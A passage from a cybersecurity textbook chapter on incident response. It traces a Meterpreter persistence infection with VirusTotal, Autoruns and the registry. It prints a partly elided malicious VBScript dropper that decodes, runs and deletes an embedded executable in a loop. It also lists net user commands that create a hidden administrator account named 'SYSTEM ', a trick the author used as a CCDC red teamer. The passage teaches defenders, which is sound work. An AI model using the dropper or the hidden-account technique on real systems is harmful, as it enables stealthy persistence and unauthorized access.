
![](img/181571ad74cba0e6a2f38fcd2658651e_282_0.png)

**FIGURE 9.14** Path to the malicious file.

I was able to upload the malicious file to VirusTotal and find the IP address that the malware was beaconing to. VirusTotal is excellent for analyzing suspicious files. It is great for use if an individual user wants to look at the behavior of a file and even if you are partaking in a cyber competition. I would not use it if you are working in the DoD as an analyst and you think you are dealing with a state-sponsored actor, as there are mechanisms (like the hash) for the bad actors to determine if their virus has been detected. More or less, you would be tipping off the hackers that you are aware of their presence, and your workplace might also not consider the file’s information something they want in the public domain (It could be related to a classified matter).

![](img/181571ad74cba0e6a2f38fcd2658651e_282_1.png)

**FIGURE 9.15** VirusTotal analysis of the Dropper file.

Another great way to locate malicious activity on your system is to use Autoruns, another essential tool that is part of the Sysinternals suite. This tool will help you to pinpoint what programs are set to launch at logon, and it will also allow you to view any services and scheduled tasks. By looking through most of the tabs within Autoruns, you can really start to find if there are any indicators of malicious activity. And, if you are participating in a cyber competition or doing dynamic malware analysis, you can run the malicious program on a Virtual Machine (Windows XP, 7, and 10 work well). It is a best practice to run malware in a virtual machine that is running in host-only mode. Some super-cautious individuals take it a step further and disable VMware Tools in an attempt to avoid any possible contamination on their host system. There is also malware that is VMware-aware, so uninstalling tools can be helpful if the malware is sophisticated enough to detect if it is running in a Virtual Environment, as it may not run under those conditions.

![](img/181571ad74cba0e6a2f38fcd2658651e_283_0.png)

**FIGURE 9.16** Autoruns.

The Autoruns tool pointed me to a VBS script running in the temp directory. So in the case of this malware, the VBS script does some base64 encoding, likely to avoid detection, and then it runs and creates a file, deletes the file, and then re-runs this program after a sleep time of 5000. Some of these tricks are meant to avoid detection from antivirus and other cybersecurity-related detection mechanisms. It is important to note that the Meterpreter connection is encrypted, so the traffic between the victim machine (in this case in the United States) and the attacker machine (in North Korea) cannot be analyzed.

```vbscript
' Malicious Visual Basic Script
Function fLJRUwXgXhr(ZMuuThUB)
    OyIbExEEyy = "<B64DECODE xmlns:dt=" & Chr(34) & "urn:schemas-microsoft-com:datatypes" & Chr(34) & " " & _
        "dt:dt=" & Chr(34) & "bin.base64" & Chr(34) & ">" & _
        ZMuuThUB & "</B64DECODE>"
    Set DCWQfIRV = CreateObject("MSXML2.DOMDocument.3.0")
    DCWQfIRV.LoadXML(OyIbExEEyy)
    fLJRUwXgXhr = DCWQfIRV.selectsinglenode("B64DECODE").nodeTypedValue
    Set DCWQfIRV = Nothing
End Function

Function QKDSXVJm()
    tvBgUHI... = "TVqQAAMAAAAEAAAA..."
    Dim erDXcvnqaq
    Set erDXcvnqaq = CreateObject("Scripting.FileSystemObject")
    Dim OVUIDeHteq
    xCHN... = erDXcvnqaq.GetSpecialFolder(2)
    xCHN... = "" & erDXcvnqaq.GetTempName()
    erDXcvnqaq.CreateFolder(xCHN...)
    apo... = xCHN... & "\\...exe"
    Dim XTeOGRACKINyHr
    Set XTeOGRACKINyHr = CreateObject("WScript.Shell")
    CzzZZOE... = fLJRUwXgXhr(tvBgUHI...)
    Set qaD... = CreateObject("ADODB.Stream")
    qaD...Type = 1
    qaD...Open
    qaD...Write CzzZZOE...
    qaD...SaveToFile apo..., 2
    XTeOGRACKINyHr.Run apo..., 0, True
    erDXcvnqaq.DeleteFile(apo...)
    erDXcvnqaq.DeleteFolder(xCHN...)
End Function

Do
    QKDSXVJm
    WScript.Sleep 5000
Loop
```

**FIGURE 9.17** Malicious Visual Basic Script.

I was able to find the script on the file system in the temp directory in the Windows directory by checking the path provided to me by Autoruns. When I upload the VBS script to VirusTotal, the site is able to provide the name of the executable that is created, prLNUjAgGAE.exe, when the script runs. It also lets me know that the file is malicious when it runs through a large number of detection engines. There are more advanced techniques that hackers can use to improve their ability to evade detection.

![](img/181571ad74cba0e6a2f38fcd2658651e_284_0.png)

**FIGURE 9.18** VirusTotal analysis of the malicious VBS file.

It is important to clarify that the original entry point for the attacker, PowerShell.exe, would not be detected in Autoruns but could be detected with Process Explorer. Only when I ran the persistence command did the VBS script and the dropper prLNUjAgGAE.exe get created. The persistence command in Meterpreter reported that it created the startup entry for the persistence in the HKLM\Software\Microsoft\Windows\CurrentVersion\Run registry key. However, that is an extremely common key that people doing forensic analysis will usually examine for startup entries, and it appears that HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run is the actual location of the registry key. I was able to detect this location by using the Autoruns tool. It detects programs that are going to start automatically in Windows and is extremely useful for dynamic malware analysis.

![](img/181571ad74cba0e6a2f38fcd2658651e_284_1.png)

**FIGURE 9.19** Registry entry of the Malicious VBS file.

## CHECK THE ACCOUNTS

So, many of the Network Intrusion Analysts, or Threat Hunters, will tell you to look for active connections to the system as well as to carefully examine the processes as we did in the first section of the chapter. It is extremely common that a hacker will get into and stay in your system or network as long as possible. But, depending on the ports that are open and the services that are running, the possibility always exists that an attacker might create credentials so they can leave and come back. For that reason, it is never a bad idea to check the accounts on the system. This step should also be part of your incident response plan, and if you get an image of RAM, you can also view your Windows accounts as you might have seen in Chapter 1 when I used the Volatility framework to extract password hashes (during a physical attack on the machine).

After typing the shell command in Meterpreter or accessing the command prompt on Windows, here is a list of commands that can be utilized to create a “SYSTEM” account, even though an account for SYSTEM that cannot be utilized by any user already exists. SYSTEM is the highest level of privilege possible on Windows, even above the administrator account. What we are doing here is actually just creating a standard account and adding a space to the name of an actual account that exists and cannot be used, and then adding it to the administrators group. The idea here is to use an account that flies under the radar, and since the SYSTEM account really exists (but is not shown), it might not be caught by someone who does not have a lot of experience analyzing Windows accounts. I have done this trick as a red teamer before at the Collegiate Cyber Defense Competition (CCDC), and it stayed on the systems during the entire two-day competition, and allowed me to log in at will and wreak havoc on the students’ boxes within the guidelines of the competition rules. And some of the students attend the best cybersecurity schools in the country, but they did not notice that “SYSTEM ” did not actually belong. Here are the commands that I ran on the system to create the account “SYSTEM” and add it to the administrators’ group:

```text
net user SYSTEM P@ssw0rd /add                 -> will not work because it says the account exists.
net user                                      -> shows a list of users but no SYSTEM account.
net user "SYSTEM " P@ssw0rd /add             -> adds a standard account named "SYSTEM " with a space
net localgroup administrators "SYSTEM " /add  -> adds the "SYSTEM " account to administrators
net user                                      -> shows a list of users including a "SYSTEM " account
```

![](img/181571ad74cba0e6a2f38fcd2658651e_285_0.png)

**FIGURE 9.20** Account Manipulation to add “SYSTEM”.
